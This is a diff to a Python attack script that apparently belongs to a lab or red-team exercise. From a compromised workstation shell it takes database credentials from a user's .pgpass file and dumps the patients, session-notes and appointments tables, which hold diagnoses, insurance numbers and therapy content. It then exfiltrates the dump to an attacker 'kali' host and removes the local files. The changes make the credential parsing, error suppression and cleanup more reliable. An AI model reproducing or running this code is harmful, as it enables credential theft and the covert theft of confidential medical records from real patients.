@@ -14,10 +14,10 @@ import time
 
 KALI_HOST        = "10.10.0.2"
 EXFIL_HTTP_PORT  = 9002
-EXFIL_LOCAL_PATH = "/tmp/db_exfil.csv"   # written on kali
+EXFIL_LOCAL_PATH = "/tmp/db_exfil.dump"   # written on kali
 
 PGPASS_PATH = "/home/john.stravidis/.pgpass"
-DUMP_PATH   = "/tmp/db_dump.csv"          # assembled on workstation
+DUMP_PATH   = "/tmp/db_dump.dump"          # assembled on workstation
 
 _sentinel_seq = 0
 
@@ -112,7 +112,7 @@ def _discover_db_creds(john_shell):
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        parts = line.split(":")
+        parts = line.split(":", 4)
         if len(parts) == 5:
             host, port, dbname, user, password = parts
             print(f"[+] Found credential: {user}@{host}:{port}/{dbname}")
@@ -124,14 +124,15 @@ def _discover_db_creds(john_shell):
 
 def _dump_db(john_shell, creds):
     """
-    Dump patients and session_notes to DUMP_PATH via psql.
-    waystar-readonly has SELECT on both — more than the webserver's
+    Dump patients, session_notes, and appointments to DUMP_PATH via psql.
+    waystar-readonly has SELECT on all three — more than the webserver's
     waystar-app (INSERT-only on appointments).
     """
-    psql_env  = f"PGPASSWORD='{creds['password']}' PGSSLMODE=disable "
+    # PGPASSFILE avoids shell-quoting issues with special characters in the password.
+    psql_env  = f"PGPASSFILE={PGPASS_PATH} PGSSLMODE=disable "
     psql_base = (
         f"psql -h {creds['host']} -p {creds['port']} "
-        f"-U {creds['user']} -d {creds['dbname']} -t -A -F , --no-align"
+        f"-U {creds['user']} -d {creds['dbname']} -t -A -F ,"
     )
 
     print("[*] Dumping patients table ...")
@@ -140,7 +141,7 @@ def _dump_db(john_shell, creds):
         f"{psql_env}{psql_base} "
         f"-c \"SELECT id,first_name,last_name,dob,gender,ins_number,"
         f"phone,email,street,city,postal_code,diagnosis FROM patients;\""
-        f" > {DUMP_PATH} 2>&1",
+        f" > {DUMP_PATH} 2>/dev/null",
         timeout=20,
     )
     row_count_raw = _run_remote(
@@ -158,7 +159,7 @@ def _dump_db(john_shell, creds):
         f"{psql_env}{psql_base} "
         f"-c \"SELECT id,patient_id,therapist,session_date,session_type,"
         f"duration_min,content FROM session_notes;\""
-        f" >> {DUMP_PATH} 2>&1",
+        f" >> {DUMP_PATH} 2>/dev/null",
         timeout=20,
     )
     notes_count_raw = _run_remote(
@@ -176,7 +177,7 @@ def _dump_db(john_shell, creds):
         f"{psql_env}{psql_base} "
         f"-c \"SELECT id,full_name,email,preferred_date,preferred_time,"
         f"focus,notes,source_ip,status FROM appointments;\""
-        f" >> {DUMP_PATH} 2>&1",
+        f" >> {DUMP_PATH} 2>/dev/null",
         timeout=20,
     )
     appt_count_raw = _run_remote(
@@ -249,6 +250,15 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
     # Phase 2 — Dump tables
     stats = _dump_db(john_shell, creds)
 
+    try:
+        dump_bytes = int(stats.get("dump_bytes", "0").strip())
+    except ValueError:
+        dump_bytes = 0
+    if dump_bytes < 10:
+        print(f"[-] Dump file appears empty ({dump_bytes} bytes) — psql may have failed; aborting")
+        _run_remote(john_shell, f"rm -f {DUMP_PATH}")
+        return {"db_creds": creds, "exfil_path": None, "exfil_ok": False, "stats": stats}
+
     # Phase 3 — Send to kali
     recv_proc = _start_receive_server()
     try:
@@ -276,7 +286,7 @@ def run(john_shell, kali_host=KALI_HOST, db_creds=None):
 
     return {
         "db_creds":    creds,
-        "exfil_path":  EXFIL_LOCAL_PATH,
+        "exfil_path":  None,       # file was cleaned up after transfer
         "exfil_ok":    exfil_ok,
         "stats":       stats,
     }
